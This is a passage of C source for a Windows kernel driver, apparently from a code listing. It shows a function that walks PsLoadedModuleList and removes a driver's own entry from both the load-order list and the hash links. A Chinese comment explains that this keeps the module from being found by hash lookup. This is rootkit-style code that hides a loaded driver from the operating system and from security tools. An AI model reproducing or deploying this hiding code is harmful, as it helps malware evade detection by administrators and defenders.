    ULONG CheckSum;
    ULONG TimeDateStamp;
} KLDR_DATA_TABLE_ENTRY_C, *PKLDR_DATA_TABLE_ENTRY_C;

static VOID UnlinkFromPsLoadedModuleList(PVOID ImageBase)
{
    PLIST_ENTRY head = &PsLoadedModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        PKLDR_DATA_TABLE_ENTRY_C ent = CONTAINING_RECORD(e, KLDR_DATA_TABLE_ENTRY_C, InLoadOrderLinks);
        if (ent->DllBase == ImageBase) {
            RemoveEntryList(&ent->InLoadOrderLinks);
            // 同时断掉 HashLinks，避免 Ldr 侧按哈希回查
            if (ent->HashLinks.Flink && ent->HashLinks.Blink)
                RemoveEntryList(&ent->HashLinks);
            return;
        }
    }
}
```

